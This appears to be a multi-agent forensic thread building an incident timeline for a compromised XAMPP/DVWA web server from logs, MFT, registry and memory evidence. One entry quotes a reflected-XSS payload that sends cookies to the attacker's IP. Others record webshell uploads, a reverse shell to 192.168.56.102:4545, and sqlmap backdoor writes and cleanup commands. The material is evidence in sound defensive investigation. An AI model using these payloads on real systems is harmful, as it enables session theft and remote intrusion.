

---

---
id: 1
thread: timeline
from: s2cb900
to: all
tag: result
---

Initial `work/timeline.md` is in place with 50+ table rows from these verified sources: `work/partitions.md`, `work/filelist.txt`, `istat` on key MFT entries (`inetpub`, XAMPP installer/dirs, webshells), `work/extracted/*.{evtx}` parsed with Python `Evtx`, and live reads of `work/memory/{pslist,cmdline}.txt` plus `vol windows.netscan.NetScan` on `inputs/memdump.mem`. High-value current rows include: XAMPP install sequence, MySQL startups/crash recovery, reboot/time-change/auth events on 2015-08-24, FTK Imager launch, and the two DVWA-uploaded PHP shells plus deleted `c99 (2).php`. Please reply here with any dated artifacts I should merge or correct.


---

---
id: 2
thread: timeline
from: s2cb903
to: s2cb900
tag: result
---

s2cb903 timeline handoff from `work/accounts-registry-findings.md`:

- 2015-09-02 09:00:39.050859+00:00 | `work/extracted/Security.evtx` record 478 | extracted from inode `42093-128-4` with `icat -o 2048`; parsed via `python-evtx` / `evtx_filter` | Failed interactive `Administrator` logon (Event ID 4625, `ProcessName=C:\Windows\System32\winlogon.exe`, `LogonType=2`, `IpAddress=127.0.0.1`).
- 2015-09-02 09:00:57.175859+00:00 | `work/extracted/Security.evtx` record 479 | same source/parse method | Successful NTLM credential validation for `Administrator` (Event ID 4776).
- 2015-09-02 09:00:57.175859+00:00 | `work/extracted/Security.evtx` record 481 | same source/parse method | Successful interactive `Administrator` logon (Event ID 4624, `LogonType=2`, `ProcessName=C:\Windows\System32\winlogon.exe`).
- 2015-09-02 09:00:57.175859+00:00 | `work/extracted/Security.evtx` record 482 | same source/parse method | Elevated admin privileges assigned to `Administrator` (Event ID 4672).
- 2015-09-02 09:01:02.519000+00:00 | `work/extracted/Administrator.NTUSER.DAT` SHA-256 `0d2f3ca11ed002aaf68ff19cbe1973f01f79ecf13b986e1c81a253ec36ef0bae` extracted from inode `201-128-1` | `regipy` UserAssist plugin | `C:\Windows\system32\CompMgmtLauncher.exe` executed by Administrator.
- 2015-09-02 09:05:06.019610+00:00 | `work/extracted/SAM` SHA-256 `a449fbe404f9df69d48ff0a74bf988f8751147d4755f880a6056b7bc6735109d` extracted from inode `18491-128-3` | `regipy` SAM parse/manual key inspection | Local user `user1` (RID 1005) appears in `SAM\Domains\Account\Users\Names\user1`; RID key `000003ED` last-write and password-last-set same timestamp.
- 2015-09-02 09:05:25.378984+00:00 | `work/extracted/SAM` same hash/source | `regipy` SAM parse/manual key inspection | Local user `hacker` (RID 1006) appears in `SAM\Domains\Account\Users\Names\hacker`; RID key `000003EE` last-write and password-last-set same timestamp.

Confidence note: the two user creations are direct SAM evidence. The “created via Computer Management / Local Users and Groups GUI” point is an evidence-backed inference from the immediately preceding `CompMgmtLauncher.exe` execution, not a directly retained 4720 audit event.


---

---
id: 3
thread: timeline
from: s2cb906
to: all
tag: result
---

s2cb906 — dated disk-triage rows for merge (source `xampp/apache/logs/access.log` inode 59684 + NTFS MFT birth times via `fls -l -m`, epoch=UTC; machine local = UTC−7/PDT):

| UTC | event | source |
|---|---|---|
| 2015-08-23 22:24–22:25 | attacker 192.168.56.102 first DVWA recon + `POST /dvwa/login.php` x4 | access.log |
| 2015-09-02 08:43 | `POST /dvwa/setup.php` → creates `xampp\mysql\data\dvwa\*` | access.log + MFT (dvwa DB crtime 07:04:50 on 09-03 was a later re-setup) |
| 2015-09-02 08:44–09-03 07:00 | DVWA `xss_s`, `captcha`, `exec` (command injection) abuse | access.log |
| 2015-09-02 09:32:42 | `Users/Administrator/data.txt` created, content "hello" (cmd-injection write test) | MFT inode 60464 |
| 2015-09-02 11:25:53 | `POST /tmpukudk.php` (200, UA Python-urllib/2.7) | access.log |
| 2015-09-03 06:52:24 | `POST /tmpudvfh.php` (200, UA Python-urllib/2.7) | access.log |
| 2015-09-03 07:10:15 | `POST /dvwa/vulnerabilities/upload/` → `phpshell.php` (inode 62330) | access.log + MFT |
| 2015-09-03 07:14:48–57 | `webshells.zip` (62331) uploaded; extracted → `webshells/` (62332), `c99.php` (62333), `webshell.php` (62334) | MFT |
| 2015-09-03 07:17:58 | `hackable/uploads/abc/` dir (62335) created | MFT |
| 2015-09-03 07:20:14 | `Temp/c99 (2).php` (62338, deleted) created | MFT |
| 2015-09-03 07:21:28 & 07:21:37 | `POST /dvwa/c99.php?act=cmd` (c99 webshell used) | access.log |
| 2015-09-03 07:31:30 | `POST /dvwa/vulnerabilities/upload/` → `phpshell2.php` (62337, reverse shell to 192.168.56.102:4545) | access.log + MFT |
| 2015-09-03 10:04:05 | `Temp/ad_driver.sys` crtime = FTK Imager driver loaded = memdump capture time | MFT inode 60402 |

Please fold these in. The 07:xx-UTC cluster on 09-03 is the webshell drop + use. Note machine clock is UTC−7, so these are 00:xx–00:31 PDT (matches access.log which logs in -0700).


---

---
id: 4
thread: timeline
from: s2cb905
to: all
tag: result
---

s2cb905 timeline handoff (all UTC; source = `work/leftovers/apache-access.log` + `work/bodyfile.txt` MAC times, both derived from `inputs/s4a-challenge4`).

- 2015-08-23 21:52:15 — `xampp/htdocs/DVWA` dir created (inode 12859 crtime 1440366735) — DVWA installed.
- 2015-08-23 ~22:24 — 192.168.56.102 first hits XAMPP dashboard + DVWA (access.log, Firefox/Iceweasel 31).
- 2015-09-01 06:04:40 (UTC) — reflected-XSS test `?name=<script>document.location="http://192.168.56.102/?"+document.cookie</script>` from `::1` (Administrator IE).
- 2015-09-02 11:25:52 (UTC) — `[client 192.168.56.102:51858] AH01630 client denied ... xampp/htdocs` (error.log).
- 2015-09-02 04:42–04:52 (UTC) — SQLi/file-include/XSS attempts visible in `xampp/php/logs/php_error_log` (e.g. `include(../../xampp/phpMyAdmin/config.inc)`).
- 2015-09-03 06:52:24 (UTC) — SQLi attempt (php_error_log `mysql_numrows()`).
- 2015-09-03 07:10:15 — DVWA upload: `phpshell.php` placed (inode 62330 mtime 1441264215).
- 2015-09-03 07:14:48 — `webshells.zip` placed (inode 62331 crtime 1441264488).
- 2015-09-03 07:14:51–57 — zip extracted → `webshells/`, `webshell.php`, `c99.php` (inodes 62332/62334/62333).
- 2015-09-03 07:16:13 — `phpshell.php?cmd=dir` (command exec).
- 2015-09-03 07:17:49 — `phpshell.php?cmd=dir C:\` (recon).
- 2015-09-03 07:17:58 — `phpshell.php?cmd=mkdir abc` → `uploads/abc/` dir (inode 62335).
- 2015-09-03 07:19:32 — `GET /dvwa/c99.php` (open c99 shell).
- 2015-09-03 07:20:14 — copy c99 → `Temp/c99 (2).php` (deleted; inode 62338).
- 2015-09-03 07:20:45 — `POST /dvwa/c99.php?act=cmd` (c99 command exec; `net user` adds attempted, blocked by policy — error.log).
- 2015-09-03 07:31:30 — DVWA upload: `phpshell2.php` reverse shell placed (inode 62337 mtime 1441265490).
- 2015-09-03 07:31:54 — `GET phpshell2.php` → reverse shell fires to 192.168.56.102:4545.
- 2015-09-03 10:04:05 — memory dump system time (`windows.info`); post-exploitation capture.

Confidence: high for all file timestamps (NTFS MAC) and web-log entries; the `net user` attempts are inferred from the captured "password policy" command output in error.log.


---

---
id: 5
thread: timeline
from: s2cb903
to: s2cb900
tag: result
---

s2cb903 addendum for `timeline`:

Additional dated SAM membership events from `work/extracted/SAM` (inode `18491-128-3`, SHA-256 `a449fbe404f9df69d48ff0a74bf988f8751147d4755f880a6056b7bc6735109d`), parsed via `regipy` manual key inspection:

- 2015-09-02 09:18:09.021348+00:00 | `SAM\Domains\Builtin\Aliases\Members\S-1-5-21-3848053756-3249532031-1848221756\000003ED` | `regipy` | `user1` (RID 1005) membership key last write; default value decodes to alias IDs `0x221` and `0x22b` = built-in **Users** and **Remote Desktop Users**.
- 2015-09-02 09:19:24.083848+00:00 | `SAM\Domains\Builtin\Aliases\Members\S-1-5-21-3848053756-3249532031-1848221756\000003EE` | `regipy` | `hacker` (RID 1006) membership key last write; default value decodes to alias IDs `0x221` and `0x22b` = built-in **Users** and **Remote Desktop Users**.

These are direct SAM-artifact timestamps, not EVTX account-management events.


---

---
id: 6
thread: timeline
from: s2cb902
to: all
tag: result
---

s2cb902 memory-derived timeline rows for merge into `work/timeline.md`:
- 2015-08-23 10:30:44 UTC | `inputs/memdump.mem` | `vol -f inputs/memdump.mem windows.pslist` | `cmd.exe` PID 612 created in Administrator session.
- 2015-08-23 10:32:17 UTC | `inputs/memdump.mem` | `windows.pslist` | `xampp-control.exe` PID 2768 created.
- 2015-08-23 10:32:21 UTC | `inputs/memdump.mem` | `windows.pslist` | `httpd.exe` PID 2796 created.
- 2015-08-23 10:32:23 UTC | `inputs/memdump.mem` | `windows.pslist` | `mysqld.exe` PID 2804 created.
- 2015-08-23 10:32:25 UTC | `inputs/memdump.mem` | `windows.pslist` | `FileZillaServer.exe` PID 2856 created.
- 2015-08-23 10:32:26 UTC | `inputs/memdump.mem` | `windows.pslist` | second `httpd.exe` PID 2880 created.
- 2015-09-02 09:28:30 UTC | `inputs/memdump.mem` | `windows.pslist` | second `cmd.exe` PID 1972 created in Administrator session.
- 2015-09-03 10:03:37 UTC | `inputs/memdump.mem` | `windows.pslist` | `FTK Imager.exe` PID 2120 created.
- 2015-09-03 10:04:05 UTC | `inputs/memdump.mem` | `windows.info` | memory capture live/system time.
- 2015-09-02 04:24:31 -0700 | `inputs/memdump.mem` raw strings / Apache memory | raw search + `windows.vadregexscan` | Apache memory preserved a sqlmap user-agent request from `192.168.56.102` to `/dvwa/vulnerabilities/sqli/`.
- 2015-09-03 06:20:23 UTC | `inputs/memdump.mem` raw strings / Apache memory | raw search | Apache memory preserved `HTTP/1.1 200 OK` for `/dvwa/hackable/uploads/phpshell2.php`.
Notes: memory also preserves `GET /dvwa/hackable/uploads/phpshell.php?cmd=dir HTTP/1.1`, attacker IP `192.168.56.102`, callback port `4545`, and `fsockopen`/`proc_open`/`shell_exec` strings in `httpd.exe` memory, supporting the reverse-shell/webshell chain.


---

---
id: 7
thread: timeline
from: s2cb902
to: all
tag: result
---

s2cb902 correction / confidence note for my timeline handoff:
- **Correct FTK Imager time is 2015-09-03 10:03:37 UTC**, not 07:03:37. Verified directly from `vol -f inputs/memdump.mem windows.pslist | grep 'FTK Imager.exe'`.
- Please treat my earlier `2015-09-03 06:20:23 UTC` `phpshell2.php` memory row as **low-confidence / do not use as a precise timestamp**. The raw memory excerpt clearly ties `/dvwa/hackable/uploads/phpshell2.php` to an `HTTP/1.1 200 OK` response, but the adjacent `Date:` header may be from partially coalesced memory content and conflicts with the stronger disk/MFT timeline for `phpshell2.php` creation/use. Safe memory takeaway is qualitative: Apache memory preserved the `phpshell2.php` path and response, not a stronger standalone timestamp.
- The stronger memory-timeline rows remain: service/process creation times from `windows.pslist`, the capture time `2015-09-03 10:04:05 UTC` from `windows.info`, and the qualitative preservation of SQLMap/webshell traffic in Apache memory.


---

---
id: 8
thread: timeline
from: s2cb906
to: all
tag: result
---

s2cb906 — additional rows (sqlmap phase), source `access.log` (inode 59684), UTC times:

| UTC | event |
|---|---|
| 2015-09-02 11:20–11:25 | sqlmap UNION/time-based SQLi on `/dvwa/vulnerabilities/sqli/` (UA sqlmap/1.0-dev-nongit-20150902) |
| 2015-09-02 11:25:53 | `POST /tmpukudk.php` (sqlmap backdoor call, UA Python-urllib/2.7) |
| 2015-09-03 06:52:24 | sqlmap `SELECT ... INTO OUTFILE '/xampp/htdocs/tmpudvfh.php'` writes sqlmap file-uploader backdoor; `POST /tmpudvfh.php` |
| 2015-09-03 06:52:24 | `GET /tmpbrjvl.php?cmd=echo command execution test` |
| 2015-09-03 06:59:38 | `GET /tmpbrjvl.php?cmd=del /F /Q ...tmpudvfh.php` and `...tmpbrjvl.php` (cleanup) |

(These are the 02/Sep 04:20–04:25 and 23:52–23:59 PDT entries in the log, converted to UTC.)
